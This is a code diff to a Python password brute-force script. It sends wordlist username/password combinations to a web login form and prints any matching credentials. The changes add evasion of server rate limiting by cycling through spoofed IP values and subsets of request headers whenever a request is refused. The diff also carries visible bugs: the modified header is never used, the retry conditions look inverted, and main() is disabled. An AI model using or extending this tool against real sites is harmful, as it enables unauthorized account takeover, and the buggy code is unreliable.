@@ -27,41 +27,71 @@ def getIPs():
 
 class Bruteforce:
 
-    def __init__(self, url, headers, idList, passList, isPresent, isAbsent):
+    def __init__(self, url, headersList, ipList, idList, passList, isPresent, isAbsent):
         self.url = url
-        self.headers = headers
+        self.headers = headersList
+        self.headerId = 0
+        self.ipList = ipList
+        self.ipId = 0
         self.idList = idList
         self.passList = passList
         self.isPresent = isPresent
         self.isAbsent = isAbsent
 
     def sendreq(self, passw, uid):
-        res = ""
+        resText = ""
+        resCode = ""
         try:
+            header = json.dumps(self.headers[self.headerId])
+            header = header.replace(self.ipList[self.ipId-1], self.ipList[self.ipId])
+            header = json.loads(header)
             res=requests.post(self.url,data={
                             "username": uid,
                             "password": passw
                             },json={
                             "username": uid,
                             "password": passw
-                            }, headers=self.headers).text
+                            }, headers=self.headers[self.headerId])
+            resCode = str(res.status_code)
+            resText = res.text
+            if resCode[0] not in ['2', '3']:
+                raise Exception("Server Rate limit") 
         except Exception as e:
-            print(e)
-            res = ""
-        if res and ((self.isPresent and self.isPresent in res) or (self.isAbsent and self.isAbsent not in res)):
+            if self.ipId < len(self.ipList):
+                self.ipId += 1
+            else:
+                self.headerId += 1
+                self.ipId = 0
+            return (False,None,None)
+        
+        if resText and ((self.isPresent and self.isPresent in resText) or (self.isAbsent and self.isAbsent not in resText)):
             print("uid-",uid)
             print("pass-",passw)
+            return (True,uid,passw)
+        
+        return (True,None,None)
 
     def bruteforce(self):
         for uid in self.idList:
-            T =[]
             for passw in self.passList:
-                
-                t = threading.Thread(target=self.sendreq, args=(passw, uid))
-                t.start()
-                T.append(t)
-            for t in T:
-                t.join()
+                response = self.sendreq(passw, uid)
+                while not response[0] and self.headerId > len(self.headers):
+                    response = self.sendreq(passw, uid)
+                if self.headerId > len(self.headers):
+                    print("Not possible with 2 headers")
+                    return 
+
+def combineHeaders(headers):
+    keys = list(headers.keys())
+    l = len(keys)
+    headerComb = []
+    for i in range(1 << l):
+        headerKeySet = [keys[j] for j in range(l) if (i & (1 << j))]
+        tempHeader = {}
+        for h in headerKeySet:
+            tempHeader[h] = headers[h]
+        headerComb.append(tempHeader)
+    return headerComb
 
 def readListFiles(fileName):
     with open(fileName, "r") as f:
@@ -105,6 +135,7 @@ def main():
     url = options.url
     with open(options.headers_file, 'r') as f:
         headers = json.loads(f.read())
+    headerCombinations = combineHeaders(headers)
     passwords = []
     ids = []
     if options.password:
@@ -118,9 +149,11 @@ def main():
         ids = readListFiles(options.id_file)
     isPresent = options.is_present 
     isNotPresent = options.is_not_present
-    Bruteforce(url, headers, ids, passwords, isPresent, isNotPresent).bruteforce()
+    Bruteforce(url=url, headersList=headerCombinations, ipList=["127.0.0.1"],
+               idList=ids, passList=passwords, isPresent=isPresent, isAbsent=isNotPresent).bruteforce()
 
 
 
 if __name__=="__main__":
-    main()
+    #main()
+    pass
